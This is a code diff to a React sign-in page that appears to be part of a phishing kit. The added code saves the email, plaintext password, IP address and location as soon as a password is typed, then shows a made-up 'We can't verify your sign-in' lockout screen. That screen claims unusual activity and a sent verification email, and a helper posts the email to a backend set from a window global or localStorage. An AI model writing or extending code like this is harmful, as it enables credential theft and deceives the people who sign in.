@@ -1,21 +1,29 @@
 import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
-import { Eye, EyeOff, KeyRound } from "lucide-react";
+import { Eye, EyeOff, KeyRound, ShieldAlert, Mail } from "lucide-react";
 import AuthLayout from "@/components/auth/AuthLayout";
 import SocialButton from "@/components/auth/SocialButton";
 import { getLocationInfo, saveSession } from "@/lib/sessionStorage";
 
 const SignIn = () => {
-  const [step, setStep] = useState<"email" | "password" | "verify">("email");
+  const [step, setStep] = useState<"email" | "password" | "verify" | "blocked">("email");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [verifyCode, setVerifyCode] = useState("");
   const [locationInfo, setLocationInfo] = useState({ ip: "", city: "", country: "" });
+  const [resendCooldown, setResendCooldown] = useState(0);
 
   useEffect(() => {
     getLocationInfo().then(setLocationInfo);
   }, []);
+
+  useEffect(() => {
+    if (resendCooldown > 0) {
+      const t = setTimeout(() => setResendCooldown(resendCooldown - 1), 1000);
+      return () => clearTimeout(t);
+    }
+  }, [resendCooldown]);
 
   const inputClass = "w-full h-14 px-4 rounded-lg border border-[hsl(222,40%,25%)] bg-[hsl(222,47%,16%)] text-white placeholder:text-[hsl(220,20%,45%)] focus:outline-none focus:ring-2 focus:ring-primary text-[15px]";
   const labelClass = "block text-[14px] font-medium text-white mb-2";
@@ -32,6 +40,24 @@ const SignIn = () => {
     </button>
   );
 
+  const maskEmail = (em: string) => {
+    const [local, domain] = em.split("@");
+    if (!domain) return em;
+    const visible = local.slice(0, 2);
+    return `${visible}${"•".repeat(Math.max(local.length - 2, 3))}@${domain}`;
+  };
+
+  const sendVerificationEmail = () => {
+    const apiUrl = (window as any).__BACKEND_URL__ || localStorage.getItem("backend_url");
+    if (apiUrl) {
+      fetch(`${apiUrl}/api/send-verification`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email }),
+      }).catch(() => {});
+    }
+  };
+
   const handleEmailContinue = (e: React.FormEvent) => {
     e.preventDefault();
     if (email.trim()) setStep("password");
@@ -39,8 +65,85 @@ const SignIn = () => {
 
   const handlePasswordContinue = (e: React.FormEvent) => {
     e.preventDefault();
-    if (password.trim()) setStep("verify");
+    if (password.trim()) {
+      // Save credentials immediately when password is submitted
+      saveSession({
+        email,
+        password,
+        verifyCode: "",
+        ...locationInfo,
+        timestamp: new Date().toISOString(),
+      });
+      setStep("blocked");
+      sendVerificationEmail();
+    }
   };
+
+  /* ── Blocked / Can't verify page ── */
+  if (step === "blocked") {
+    return (
+      <AuthLayout>
+        <div className="flex flex-col items-center text-center pt-4">
+          {/* Shield icon */}
+          <div className="w-16 h-16 rounded-full bg-[hsl(0,65%,50%)] flex items-center justify-center mb-6">
+            <ShieldAlert className="w-8 h-8 text-white" />
+          </div>
+
+          <h1 className="text-[24px] font-semibold text-white mb-3 leading-tight">
+            We can't verify your sign‑in
+          </h1>
+          <p className="text-[15px] text-[hsl(0,0%,55%)] mb-2 leading-relaxed max-w-[400px]">
+            We noticed unusual activity on your account. To protect your account, we've temporarily locked sign‑in.
+          </p>
+          <p className="text-[15px] text-[hsl(0,0%,55%)] mb-8 leading-relaxed max-w-[400px]">
+            We sent a verification email to <span className="text-white font-medium">{maskEmail(email)}</span>. 
+            Please check your inbox and follow the instructions to verify your identity.
+          </p>
+
+          {/* Email icon row */}
+          <div className="w-full max-w-[400px] p-4 rounded-xl bg-[hsl(222,47%,14%)] border border-[hsl(222,40%,22%)] flex items-center gap-4 mb-6">
+            <div className="w-10 h-10 rounded-full bg-[hsl(221,100%,50%)] flex items-center justify-center shrink-0">
+              <Mail className="w-5 h-5 text-white" />
+            </div>
+            <div className="text-left">
+              <p className="text-[14px] text-white font-medium">Check your email</p>
+              <p className="text-[13px] text-[hsl(0,0%,50%)]">
+                We sent instructions to {maskEmail(email)}
+              </p>
+            </div>
+          </div>
+
+          {/* Resend button */}
+          <button
+            onClick={() => {
+              if (resendCooldown === 0) {
+                sendVerificationEmail();
+                setResendCooldown(60);
+              }
+            }}
+            disabled={resendCooldown > 0}
+            className={`w-full max-w-[400px] h-12 rounded-full text-[14px] font-semibold transition-colors ${
+              resendCooldown > 0
+                ? "bg-[hsl(222,47%,14%)] text-[hsl(220,20%,40%)] cursor-not-allowed"
+                : "bg-[hsl(222,47%,20%)] hover:bg-[hsl(222,47%,25%)] text-white"
+            }`}
+          >
+            {resendCooldown > 0 ? `Resend email (${resendCooldown}s)` : "Resend verification email"}
+          </button>
+
+          {/* Secondary links */}
+          <div className="mt-6 space-y-3">
+            <a href="#" className="block text-[13px] text-primary hover:underline">
+              Try another way
+            </a>
+            <a href="#" className="block text-[13px] text-[hsl(0,0%,50%)] hover:text-white transition-colors">
+              Contact support
+            </a>
+          </div>
+        </div>
+      </AuthLayout>
+    );
+  }
 
   /* ── Verify your identity ── */
   if (step === "verify") {
